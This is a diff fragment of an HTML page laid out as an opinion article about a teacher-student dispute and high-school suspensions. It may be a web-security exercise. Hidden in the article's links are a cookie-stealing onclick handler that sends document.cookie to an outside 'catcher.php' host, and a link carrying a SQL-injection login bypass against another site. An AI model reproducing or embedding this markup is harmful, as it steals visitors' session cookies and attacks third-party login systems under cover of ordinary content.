@@ -21,7 +21,7 @@ High-School Suspensions</h2>
 
 <p class="details">By SUSAN DOMINUSSEPT. 9 Sept, 2016  <a href="#"></a> </p>
 <h2 align="right"><a href="20160908-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160910-opinion.php"> Next </a> </h2>
 <p>
 In December 2013, Colleen Walsh, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> a social-studies teacher </a> at Leadership and Public Service High School in Manhattan’s Financial District, called one of the school’s four deans in charge of discipline. She had just had a short, heated dispute in the hallway with a 17-year-old student who had his cellphone out, a violation of school rules. Walsh, then 27, was an energetic teacher, entertaining and assertive, but something about the way she spoke to the young man, who was not her student, infuriated him. A junior who could be exceptionally charming but also combative, <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">  he started yelling at Walsh, at which point she contacted a dean in </a> the hope that he could calm him so they could all discuss what had happened.
 </p> <p>
